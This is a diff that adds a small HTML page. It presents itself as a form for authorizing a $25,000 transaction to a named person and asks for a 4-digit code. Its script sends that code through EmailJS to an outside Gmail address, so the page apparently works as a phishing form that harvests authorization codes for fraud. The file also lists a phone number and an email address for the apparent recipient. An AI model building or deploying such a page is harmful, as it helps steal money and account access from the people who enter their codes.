@@ -1,0 +1,97 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Send Authorization Code</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+            background-color: #f0f0f0;
+        }
+        .container {
+            text-align: center;
+            padding: 20px;
+            background-color: white;
+            border-radius: 8px;
+            box-shadow: 0 0 10px rgba(0,0,0,0.1);
+        }
+        input[type="text"] {
+            padding: 10px;
+            font-size: 16px;
+            margin: 10px 0;
+            width: 100px;
+            text-align: center;
+        }
+        button {
+            padding: 10px 20px;
+            font-size: 16px;
+            cursor: pointer;
+            background-color: #4CAF50;
+            color: white;
+            border: none;
+            border-radius: 4px;
+        }
+        button:hover {
+            background-color: #45a049;
+        }
+        #status {
+            margin-top: 10px;
+            color: #333;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h2>Send Authorization Code</h2>
+        <p>Enter a 4-digit code for a $25,000 transaction to Igor Mezentsev.</p>
+        <input type="text" id="authCode" maxlength="4" placeholder="Enter 4-digit code" pattern="\d{4}" oninput="this.value = this.value.replace(/[^0-9]/g, '')">
+        <br>
+        <button onclick="sendAuthorizationCode()">Send Code</button>
+        <p id="status"></p>
+    </div>
+
+    <script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
+    <script>
+        // Initialize EmailJS with your User ID
+        emailjs.init("YOUR_EMAILJS_USER_ID"); // Replace with your EmailJS User ID
+
+        function sendAuthorizationCode() {
+            const code = document.getElementById("authCode").value;
+            const recipientName = "Igor Mezentsev";
+            const recipientPhone = "+7 922 235-71-77";
+            const amount = "$25,000";
+            const recipientEmail = "cryptovesthub@gmail.com";
+
+            // Validate the code
+            if (!/^\d{4}$/.test(code)) {
+                document.getElementById("status").innerText = "Please enter a valid 4-digit code.";
+                return;
+            }
+
+            const templateParams = {
+                to_name: recipientName,
+                auth_code: code,
+                transaction_amount: amount,
+                to_email: recipientEmail,
+                from_email: "web3@jpprogram.art"
+            };
+
+            // Send email using EmailJS
+            emailjs.send("service_q9zvrvl", "__ejs-test-mail-service__", templateParams)
+                .then(function(response) {
+                    document.getElementById("status").innerText = "Code sent successfully!";
+                    console.log("Email sent:", response.status, response.text);
+                }, function(error) {
+                    document.getElementById("status").innerText = "Failed to send code. Please check EmailJS configuration.";
+                    console.error("Email sending failed:", error);
+                });
+        }
+    </script>
+</body>
+</html>
